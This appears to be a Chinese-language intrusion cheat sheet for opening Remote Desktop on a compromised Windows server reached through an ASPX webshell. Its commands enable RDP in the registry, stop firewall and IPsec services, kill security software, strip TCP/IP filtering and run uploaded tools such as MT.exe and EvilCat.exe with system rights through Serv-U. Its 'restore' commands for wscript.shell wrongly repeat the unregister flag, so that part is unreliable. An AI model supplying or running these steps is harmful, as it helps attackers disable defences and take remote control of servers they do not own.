aspx大马查看
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server\WinStations\RDP-Tcp


REG query HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server\WinStations\RDP-Tcp /v PortNumber  命令行查看3389端口
 
REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal" "Server /v fDenyTSConnections /t REG_DWORD /d 0 /f    开3389
 
shutdown -r -t 0          重启



3389连接不上的解决方法
 如果直接连接连接不上的话,有可能是以下几种情况以及解决方法
 
1.远程桌面服务没开启
 可以把
 REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal” “Server /v fDenyTSConnections /t REG_DWORD /d 0 /f
 保存成bat文件在cmd下找个可写目录然后以system权限运行.

 2.IP策略阻拦
 sc stop policyagent

 3.windows自带防火墙阻拦
 net stop sharedaccess

 4.其他防火墙阻拦
 tasklist /svc此命令可以获取每个进程中主持的服务
 看到哪个不是系统自带的服务或者正在运行的进程
 用ntsd -c q -pn xxx.exe 和 net stop 还有sc stop 这几个命令以system权限xx掉它.
 5.内网
 可以通过lcx等转发工具.

 

1、服务器在内网。
 　　2、做了tcp/ip筛选。
 　　先执行下面cmd命令：
 　　cmd /c regedit -e c:\1.reg HKEY_LOCAL_MACHINE\SYSTEM\ControlSet001\Services\Tcpip，导出注册表里关于TCP/IP筛选的第一处
 　　cmd /c regedit -e c:\2.reg HKEY_LOCAL_MACHINE\SYSTEM\ControlSet002\Services\Tcpip，导出注册表里关于TCP/IP筛选的第二处
 　　cmd /c regedit -e c:\3.reg HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\Tcpip"，导出注册表里关于TCP/IP筛选的第三处
 　　然后回到c盘1.reg,2.reg,3.reg，把1.reg
 
,2.reg,3.reg下载回来到自己的硬盘里面编辑一下，找到 EnableSecurityFilters这个字段看看dword后面的键值是否为00000000，如果为00000001就说明管理员做了tcp/ip筛选，我们只要把1改成0就行了，2.reg 和3.reg进行一样的修改。
 　　3、做了ip安全策略。
 　　执行cmd命令： cmd /c net stop policyagent 将IPSEC Services服务停了它。再连3389。
 　　4、管理员设置的终端登陆权限只有指定的用户可以。
 　　5、防火墙。
 

wscript.shell × 命令行执行组件
这是因为wscript.shell改名了，或者从注册表删除了
 
删除方法：
regsvr32/u C:\windows\System32\wshom.ocx
regsvr32/u C:\windows\System32\shell32.dll
 
恢复方法：
regsvr32/u C:\windows\System32\wshom.ocx
regsvr32/u C:\windows\System32\shell32.dll
 
这里利用serv-u执行恢复命令
cmd /c regsvr32/u C:\windows\System32\wshom.ocx
cmd /c regsvr32/u C:\windows\System32\shell32.dll
 
恢复wscript.shell之后，本来不能读取的3389端口，变为可以读取了
 
为什么有时候3389开放却不能连接，有时候是因为防火墙，把终端端口转发到其他端口就可以连接，
但是更多的转发后依然是连接不上，哪是因为管理员在TCP/IP里设置的端口限制。
就算再怎么转都是连不上的。
我们需要把端口转为TCP/IP里设置的只允许连接的端口其中一个就可以了，
更好的办法是取消端口限制。
 
我们上传一个MT到肉鸡上，然后用具备系统权限的sev-u来执行命令。
上传cmd.exe，MT.exe到C盘，
就在Serv-u执行：c:\cmd.exe /c "mt -filter off"
而且运行成功，肉鸡也不会重启。
 
也可以传一个“解除TCPIP筛选的小工具EvilCat.exe”(有个小小缺点，运行后主机会重启)
直接运行就可以了
传到c:\EvilCat.exe
在Serv-u执行就OK了：c:\cmd.exe /c "EvilCat.exe"
